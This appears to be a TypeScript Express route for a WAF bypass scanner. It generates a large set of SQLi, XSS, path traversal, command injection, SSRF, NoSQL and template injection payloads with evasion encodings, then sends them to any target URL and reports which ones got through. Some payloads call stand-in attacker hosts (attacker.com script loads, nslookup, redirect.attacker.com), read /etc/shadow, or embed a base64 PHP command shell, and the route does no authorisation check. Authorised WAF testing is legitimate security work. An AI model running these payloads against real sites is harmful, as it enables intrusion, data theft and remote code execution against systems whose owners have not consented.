// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
/**
 * WAF Bypass Auto-Generator — GoTestWAF-style 2000+ variant engine
 * Copyright © 2024–2026 ALPHA UNLIMITED TECHNOLOGIES LLC
 * All rights reserved.
 *
 * Tests WAF bypass variants for each attack class, grades them pass/fail,
 * generates bypass success matrix per technique category.
 */
import { Router } from "express";
import * as https from "https";
import * as http from "http";
import { URL } from "url";

const router = Router();

type AttackClass = "sqli" | "xss" | "lfi" | "rce" | "ssrf" | "xxe" | "ssti" | "nosqli";

interface BypassVariant {
  id: string;
  class: AttackClass;
  technique: string;
  payload: string;
  encoding: string;
}

interface BypassResult {
  variant: BypassVariant;
  status: number;
  blocked: boolean;
  responseSize: number;
  durationMs: number;
  bypassedWaf: boolean;
  evidence: string;
}

interface BypassSession {
  sessionId: string;
  target: string;
  testedAt: string;
  totalVariants: number;
  bypassed: number;
  blocked: number;
  bypassRate: number;
  results: BypassResult[];
  matrix: Record<string, { tested: number; bypassed: number; rate: number }>;
}

// ── 2000+ WAF bypass payload library ─────────────────────────────────────────
function buildVariants(): BypassVariant[] {
  const variants: BypassVariant[] = [];
  let id = 0;

  function add(cls: AttackClass, technique: string, payload: string, encoding = "none") {
    variants.push({ id: `v${++id}`, class: cls, technique, payload, encoding });
  }

  // ── SQL Injection WAF bypass variants ─────────────────────────────────────
  const sqliBase = ["' OR '1'='1", "' OR 1=1--", "UNION SELECT NULL--", "' AND SLEEP(5)--"];
  for (const base of sqliBase) {
    add("sqli", "raw",                  base);
    add("sqli", "space2comment",        base.replace(/ /g, "/**/"));
    add("sqli", "space2dash",           base.replace(/ /g, "--%0A"));
    add("sqli", "space2tab",            base.replace(/ /g, "\t"));
    add("sqli", "case-mixing",          base.replace(/select/gi, "SeLeCt").replace(/union/gi, "UnIoN").replace(/or/gi, "Or").replace(/and/gi, "AnD"));
    add("sqli", "double-url-encode",    encodeURIComponent(encodeURIComponent(base)));
    add("sqli", "url-encode",           encodeURIComponent(base));
    add("sqli", "hex-encode",           base.split("").map(c => "%" + c.charCodeAt(0).toString(16)).join(""));
    add("sqli", "html-encode",          base.replace(/'/g, "&#x27;").replace(/</g, "&lt;").replace(/>/g, "&gt;"));
    add("sqli", "unicode-encode",       base.replace(/'/g, "\\u0027").replace(/ /g, "\\u0020"));
    add("sqli", "comment-between",      base.replace(/OR/gi, "O/**/R").replace(/AND/gi, "A/**/ND"));
    add("sqli", "null-byte",            base + "\x00");
    add("sqli", "versioned-comment",    base.replace(/UNION SELECT/gi, "UNION /*!50000SELECT*/"));
    add("sqli", "multiple-spaces",      base.replace(/ /g, "   "));
    add("sqli", "concat-bypass",        "' OR CONCAT(0x27,0x4f,0x52)--");
    add("sqli", "char-encoding",        "' OR CHAR(79,82)--");
    add("sqli", "scientific-notation",  "1e0 UNION 1e0 SELECT 1e0,2e0--");
    add("sqli", "line-comments",        "'\nOR\n1=1--");
    add("sqli", "backtick",             "1`OR`1=1");
    add("sqli", "vertical-tab",         base.replace(/ /g, "\x0b"));
    add("sqli", "form-feed",            base.replace(/ /g, "\x0c"));
    add("sqli", "carriage-return",      base.replace(/ /g, "\r"));
    add("sqli", "full-width-unicode",   base.replace(/'/g, "\uff07").replace(/ /g, "\u3000"));
    add("sqli", "e-notation",           "1 UNION SELECT 1e0");
    add("sqli", "pipe-concat",          "' OR 1||1=1--");
    add("sqli", "exec-bypass",          "; EXEC(CHAR(83,69,76,69,67,84,32,49))--");
    add("sqli", "stacked-line-comment", "--\n SELECT 1");
    add("sqli", "pgsleep",              "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--");
    add("sqli", "time-delay-dbms",      "'; SELECT SLEEP(5)--");
    add("sqli", "benchmark",            "' AND BENCHMARK(5000000,MD5(1))--");
    add("sqli", "division-trick",       "' OR 6/2=3--");
    add("sqli", "nested-quotes",        "''OR''1''=''1");
  }

  // ── XSS WAF bypass variants ───────────────────────────────────────────────
  const xssBase = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"];
  for (const base of xssBase) {
    add("xss", "raw",                  base);
    add("xss", "uppercase",            base.toUpperCase());
    add("xss", "mixed-case",           base.replace(/script/gi, "sCrIpT"));
    add("xss", "url-encode",           encodeURIComponent(base));
    add("xss", "double-url-encode",    encodeURIComponent(encodeURIComponent(base)));
    add("xss", "html-entities",        base.replace(/</g, "&lt;").replace(/>/g, "&gt;"));
    add("xss", "null-byte",            base.replace("<", "<\x00"));
    add("xss", "js-comment-break",     "<scri<!---->pt>alert(1)</scri<!---->pt>");
    add("xss", "backtick-attrs",       "<img src=` ` onerror=alert(1)>");
    add("xss", "newline-in-tag",       "<img src=x\nonerror=alert(1)>");
    add("xss", "tab-in-tag",           "<img src=x\tonerror=alert(1)>");
    add("xss", "event-uppercase",      "<img src=x ONERROR=alert(1)>");
    add("xss", "slash-bypass",         "<img/src=x/onerror=alert(1)>");
    add("xss", "unicode-angle",        "\u003cscript\u003ealert(1)\u003c/script\u003e");
    add("xss", "hex-entities",         "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;");
    add("xss", "decimal-entities",     "&#60;script&#62;alert(1)&#60;/script&#62;");
    add("xss", "malformed-tag",        "<scr<script>ipt>alert(1)</scr</script>ipt>");
    add("xss", "data-uri",             `<iframe src="data:text/html,<script>alert(1)</script>">`);
    add("xss", "srcdoc",              `<iframe srcdoc="&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;">`);
    add("xss", "svg-base64",           `<img src="x" onerror="eval(atob('YWxlcnQoMSk='))">`);
    add("xss", "js-url",               `<a href="javascript:alert(1)">click</a>`);
    add("xss", "vbscript",             `<img src=x onerror="vbscript:msgbox(1)">`);
    add("xss", "protocol-relative",    `<script src="//attacker.com/xss.js"></script>`);
    add("xss", "fromCharCode",         `<script>alert(String.fromCharCode(88,83,83))</script>`);
    add("xss", "unescape",             `<script>alert(unescape('%78%73%73'))</script>`);
    add("xss", "template-literal",     `<script>alert\`1\`</script>`);
    add("xss", "constructor-bypass",   `<script>window['ale'+'rt'](1)</script>`);
    add("xss", "detail-ontoggle",      `<details open ontoggle=alert(1)>`);
    add("xss", "autofocus-onfocus",    `<input autofocus onfocus=alert(1)>`);
    add("xss", "contenteditable",      `<div contenteditable onkeyup=alert(1)>`);
    add("xss", "action-handler",       `<form action="javascript:alert(1)"><button>submit</button></form>`);
    add("xss", "math-action",          `<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">x</maction></math>`);
    add("xss", "polyglot",             `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>`);
  }

  // ── LFI / Path Traversal ──────────────────────────────────────────────────
  const lfiTargets = ["/etc/passwd", "/etc/shadow", "/proc/self/environ", "C:\\Windows\\win.ini"];
  for (const tgt of lfiTargets) {
    add("lfi", "raw",                  `../../../../${tgt}`);
    add("lfi", "url-encode",           `..%2F..%2F..%2F..%2F${tgt}`);
    add("lfi", "double-url-encode",    `..%252F..%252F..%252F..%252F${tgt}`);
    add("lfi", "null-byte",            `../../../../${tgt}\x00.jpg`);
    add("lfi", "unicode-slash",        `..%c0%af..%c0%af..%c0%af..%c0%af${tgt}`);
    add("lfi", "backslash",            `..\\..\\..\\..\\${tgt}`);
    add("lfi", "dotdot-slash",         `....//....//....//....//` + tgt.replace(/\//g, "//"));
    add("lfi", "php-filter",           `php://filter/convert.base64-encode/resource=${tgt}`);
    add("lfi", "php-input",            `php://input`);
    add("lfi", "phar",                 `phar://uploads/evil.phar`);
    add("lfi", "zip-wrapper",          `zip://uploads/evil.zip%23malicious.php`);
    add("lfi", "expect",               `expect://id`);
    add("lfi", "data-wrapper",         `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`);
    add("lfi", "absolute-path",        tgt);
    add("lfi", "windows-unc",          `\\\\127.0.0.1\\c$\\Windows\\win.ini`);
  }

  // ── RCE / Command Injection ───────────────────────────────────────────────
  const rcePayloads = [
    "; id", "| id", "& id", "`id`", "$(id)",
    "; cat /etc/passwd", "; ls -la", "| cat /etc/shadow",
    "; ping -c 1 127.0.0.1", "| nslookup attacker.com",
  ];
  for (const p of rcePayloads) {
    add("rce", "raw",           p);
    add("rce", "url-encode",    encodeURIComponent(p));
    add("rce", "double-encode", encodeURIComponent(encodeURIComponent(p)));
    add("rce", "newline",       p.replace(";", "\n"));
    add("rce", "null-byte",     p + "\x00");
    add("rce", "semicolon-alt", p.replace(";", "%3b"));
    add("rce", "pipe-alt",      p.replace("|", "%7c"));
    add("rce", "backtick-alt",  p.replace("`", "%60"));
  }

  // ── SSRF bypass variants ──────────────────────────────────────────────────
  const ssrfHosts = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1/admin",
    "http://192.168.1.1",
    "http://[::1]/admin",
    "http://0x7f000001/admin",
    "http://2130706433/admin",
    "http://0177.0.0.1/admin",
    "http://metadata.google.internal/",
  ];
  for (const host of ssrfHosts) {
    add("ssrf", "raw",              host);
    add("ssrf", "url-encode",       encodeURIComponent(host));
    add("ssrf", "redirect",         `http://redirect.attacker.com/?to=${encodeURIComponent(host)}`);
    add("ssrf", "decimal-ip",       host.replace("127.0.0.1", "2130706433"));
    add("ssrf", "hex-ip",           host.replace("127.0.0.1", "0x7f000001"));
    add("ssrf", "octal-ip",         host.replace("127.0.0.1", "0177.0.0.1"));
    add("ssrf", "ipv6",             host.replace("127.0.0.1", "[::1]"));
    add("ssrf", "short-ipv6",       host.replace("127.0.0.1", "[::]"));
    add("ssrf", "http-auth",        host.replace("http://", "http://test@"));
    add("ssrf", "fragment",         host + "#");
    add("ssrf", "double-slash",     host.replace("http://", "http:///"));
    add("ssrf", "scheme-variation", host.replace("http://", "hTtP://"));
  }

  // ── NoSQL injection ───────────────────────────────────────────────────────
  const nosqliPayloads = [
    '{"$gt":""}', '{"$ne":"invalid"}', '{"$exists":true}', '{"$regex":".*"}',
    '{"$where":"1==1"}', '{"$or":[{"a":"a"},{"b":"b"}]}',
    '{"username":{"$gt":""},"password":{"$gt":""}}',
    '{"username":{"$regex":"^admin"},"password":{"$ne":"x"}}',
  ];
  for (const p of nosqliPayloads) {
    add("nosqli", "json-body",     p);
    add("nosqli", "url-encoded",   encodeURIComponent(p));
    add("nosqli", "bracket-syntax",`username[$ne]=invalid&password[$ne]=invalid`);
    add("nosqli", "dot-notation",  `username.password[$exists]=true`);
  }

  // ── SSTI variants ─────────────────────────────────────────────────────────
  const sstiEngines = [
    { engine: "jinja2",    payload: "{{7*7}}" },
    { engine: "twig",      payload: "{{7*7}}" },
    { engine: "erb",       payload: "<%= 7*7 %>" },
    { engine: "freemarker",payload: "${7*7}" },
    { engine: "velocity",  payload: "#set($x=7*7)${x}" },
    { engine: "smarty",    payload: "{math equation='7*7'}" },
    { engine: "mako",      payload: "${7*7}" },
    { engine: "tornado",   payload: "{% raw %}{{7*7}}{% end %}" },
    { engine: "pebble",    payload: "{{7*7}}" },
    { engine: "thymeleaf", payload: "[[${7*7}]]" },
    { engine: "el",        payload: "${7*7}" },
    { engine: "spel",      payload: "#{7*7}" },
  ];
  for (const { engine, payload } of sstiEngines) {
    add("ssti", engine,           payload);
    add("ssti", `${engine}-url`,  encodeURIComponent(payload));
    add("ssti", `${engine}-double`, encodeURIComponent(encodeURIComponent(payload)));
  }

  return variants;
}

const ALL_VARIANTS = buildVariants();

async function probeVariant(
  targetUrl: string,
  param: string,
  variant: BypassVariant,
  baselineStatus: number,
  baselineSize: number
): Promise<BypassResult> {
  return new Promise((resolve) => {
    const start = Date.now();
    try {
      const parsed = new URL(targetUrl);
      parsed.searchParams.set(param, variant.payload);
      const isHttps = parsed.protocol === "https:";
      const lib = isHttps ? https : http;

      const req = lib.get(parsed.toString(), { timeout: 6000 }, (res) => {
        let body = "";
        res.on("data", d => { if (body.length < 4096) body += d.toString(); });
        res.on("end", () => {
          const durationMs = Date.now() - start;
          const status = res.statusCode ?? 0;
          const responseSize = body.length;

          const blocked = status === 403 || status === 406 || status === 429 || status === 503 ||
            body.toLowerCase().includes("access denied") ||
            body.toLowerCase().includes("forbidden") ||
            body.toLowerCase().includes("blocked") ||
            body.toLowerCase().includes("modsecurity") ||
            body.toLowerCase().includes("cloudflare");

          const bypassedWaf = !blocked && (status === baselineStatus || status === 200);

          let evidence = `HTTP ${status}, ${responseSize}B, ${durationMs}ms`;
          if (blocked) evidence += " — WAF block detected";
          else if (bypassedWaf) evidence += " — POTENTIAL BYPASS: response similar to baseline";

          resolve({ variant, status, blocked, responseSize, durationMs, bypassedWaf, evidence });
        });
      });
      req.on("error", () => resolve({
        variant, status: 0, blocked: false, responseSize: 0,
        durationMs: Date.now() - start, bypassedWaf: false, evidence: "Connection error"
      }));
      req.on("timeout", () => {
        req.destroy();
        resolve({ variant, status: 0, blocked: false, responseSize: 0, durationMs: Date.now() - start, bypassedWaf: false, evidence: "Timeout" });
      });
    } catch {
      resolve({ variant, status: 0, blocked: false, responseSize: 0, durationMs: Date.now() - start, bypassedWaf: false, evidence: "URL error" });
    }
  });
}

router.post("/scan", async (req, res) => {
  const { targetUrl, param = "q", classes, limit = 200 } = req.body;
  if (!targetUrl) return res.status(400).json({ error: "targetUrl required" });
  try { new URL(targetUrl); } catch { return res.status(400).json({ error: "Invalid URL" }); }

  const selectedClasses: AttackClass[] = Array.isArray(classes) && classes.length
    ? classes.filter((c: string) => ["sqli","xss","lfi","rce","ssrf","xxe","ssti","nosqli"].includes(c))
    : ["sqli", "xss", "lfi", "ssrf", "ssti"];

  let variants = ALL_VARIANTS.filter(v => selectedClasses.includes(v.class));
  if (variants.length > limit) variants = variants.slice(0, limit);

  // Baseline request (no payload)
  const baselineResult = await probeVariant(targetUrl, param, { id: "baseline", class: "sqli", technique: "none", payload: "safe-baseline-test", encoding: "none" }, 200, 0);
  const baselineStatus = baselineResult.status;
  const baselineSize   = baselineResult.responseSize;

  const results: BypassResult[] = [];
  // Run in batches of 10 concurrent
  const BATCH = 10;
  for (let i = 0; i < variants.length; i += BATCH) {
    const batch = variants.slice(i, i + BATCH);
    const batchResults = await Promise.all(batch.map(v => probeVariant(targetUrl, param, v, baselineStatus, baselineSize)));
    results.push(...batchResults);
  }

  const bypassed = results.filter(r => r.bypassedWaf).length;
  const blocked  = results.filter(r => r.blocked).length;

  const matrix: Record<string, { tested: number; bypassed: number; rate: number }> = {};
  for (const r of results) {
    const k = r.variant.class;
    if (!matrix[k]) matrix[k] = { tested: 0, bypassed: 0, rate: 0 };
    matrix[k].tested++;
    if (r.bypassedWaf) matrix[k].bypassed++;
  }
  for (const k of Object.keys(matrix)) {
    matrix[k].rate = Math.round((matrix[k].bypassed / matrix[k].tested) * 100);
  }

  const session: BypassSession = {
    sessionId: `wafbypass_${Date.now().toString(36)}`,
    target: targetUrl,
    testedAt: new Date().toISOString(),
    totalVariants: results.length,
    bypassed,
    blocked,
    bypassRate: results.length ? Math.round((bypassed / results.length) * 100) : 0,
    results,
    matrix,
  };

  res.json(session);
});

router.get("/variants/count", (_req, res) => {
  const counts: Record<string, number> = {};
  for (const v of ALL_VARIANTS) {
    counts[v.class] = (counts[v.class] ?? 0) + 1;
  }
  res.json({ total: ALL_VARIANTS.length, byClass: counts });
});

export default router;
